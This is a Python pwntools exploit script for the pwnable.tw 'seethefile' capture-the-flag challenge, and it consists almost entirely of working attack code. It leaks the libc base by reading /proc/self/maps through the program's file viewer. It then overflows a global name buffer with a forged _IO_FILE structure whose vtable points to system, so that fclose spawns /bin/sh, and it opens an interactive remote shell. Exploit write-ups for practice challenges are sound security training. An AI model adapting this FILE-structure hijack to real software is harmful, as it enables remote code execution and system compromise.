#!/usr/bin/env python

from pwn import *

context.update(log_level='debug', arch='amd64', os='linux', terminal=['tmux', 'splitw', '-h'])

#p = process('./seethefile', env = {'LD_PRELOAD': './libc_32.so.6'})
p = remote('chall.pwnable.tw', 10200)

Debug = False

if Debug:
    gdb.attach(p, '''
        break fclose
        ignore 1 1
        continue
    ''')

def open_file(name):
    p.sendlineafter('Your choice :', '1')
    p.sendlineafter('What do you want to see :', name)

def read_file():
    p.sendlineafter('Your choice :', '2')

def write_file():
    p.sendlineafter('Your choice :', '3')
    tmp = p.recvuntil("choice :").split("\n")[1][0:8]
    return int(tmp, 16)

def close_file():
    p.sendline('4')

def exit_app(name):
    p.sendlineafter('Your choice :', '5')
    p.sendlineafter('Leave your name :', name)

open_file('/proc/self/maps')
read_file()
read_file()
libc_base = write_file()
log.success('libc_base = ' + hex(libc_base))
close_file()

name_addr = 0x804b260
system_offset = 0x3a940

system_addr = libc_base + system_offset
log.success('system_addr = ' + hex(system_addr))

binsh = '/bin/sh\x00'

payload = binsh
payload = payload.ljust(0x20, '\x00')
payload += p32(name_addr)
payload = payload.ljust(0x48, '\x00')
payload += p32(name_addr + len(binsh)) # lock
payload = payload.ljust(0x94, '\x00')   # sizeof(_IO_FILE) = 0x94
payload += p32(name_addr + 0x94)
payload += p32(0) * 2
payload += p32(system_addr) * 17

exit_app(payload)

p.interactive()
